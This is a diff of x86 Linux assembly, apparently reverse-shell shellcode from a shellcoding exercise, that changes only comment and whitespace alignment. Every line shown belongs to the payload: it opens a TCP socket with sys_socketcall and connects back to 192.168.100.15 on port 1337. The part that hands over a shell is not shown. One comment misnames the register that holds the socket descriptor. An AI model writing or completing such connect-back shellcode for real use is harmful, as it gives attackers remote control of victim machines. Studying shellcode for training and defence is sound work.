@@ -13,22 +13,22 @@ _start:
 
   ; Create socket
   xor    ebx,ebx	; zero out ebx
-  mul    ebx		; zero out eax & edx
-  push   ebx            ; push IPPROTO = 0
+  mul    ebx		  ; zero out eax & edx
+  push   ebx      ; push IPPROTO = 0
   inc    ebx
-  push   ebx            ; push SOCK_STREAM=1
-  push   0x2            ; push AF_INET=2
+  push   ebx      ; push SOCK_STREAM=1
+  push   0x2      ; push AF_INET=2
   mov    al,0x66	; store sys_socketcall system call number in al
   mov    ecx,esp	; store pointer to arguments in ecx
-  int    0x80           ; invoke system call
+  int    0x80     ; invoke system call
   xchg   edi,eax	; store the socket file descriptor in esi
 
   ; Connect
-  pop    ebx		; pop connect sub function number 1 into ebx
+  pop    ebx		    ; pop connect sub function number 1 into ebx
   push   0xf64a8c0	; push IP address 192.168.100.15
   push   0x39050002	; push port 1337
   mov    ecx,esp	; store pointer to arguments in ecx
-  push   0x66		; store sys_socketcall system call number in al
+  push   0x66		  ; store sys_socketcall system call number in al
   pop    eax
   push   eax		; use eax as sizeof(struct sockaddr_in)
   push   ecx		; &serv_addr
